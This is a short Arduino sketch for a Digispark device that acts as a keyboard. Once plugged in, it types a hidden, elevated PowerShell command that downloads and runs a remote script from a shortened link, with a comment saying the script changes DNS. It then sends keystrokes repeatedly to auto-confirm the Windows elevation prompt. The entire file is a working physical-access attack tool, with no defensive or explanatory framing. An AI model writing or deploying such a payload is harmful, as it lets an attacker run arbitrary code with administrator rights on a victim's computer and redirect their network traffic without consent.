#include "DigiKeyboard.h"

void winRun(const char* command){
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT  ); // press the windows key
  DigiKeyboard.delay(300); // wait a second
  DigiKeyboard.println(command);
}

void confirm(){
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  
}
void setup() {
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(0);

  /// change dns: https://bit.ly/3gP18o7
  winRun("powershell \"Start-Process powershell -Verb RunAs -ArgumentList '-W','Hidden', \\\"IEX (New-Object Net.WebClient).DownloadString(\'https://bit.ly/3gP18o7\');\\\"  \"  ");
  DigiKeyboard.delay(1000);
  confirm();
  confirm();
  confirm();
  confirm();
  confirm();
}

void loop() {
  DigiKeyboard.update();
}
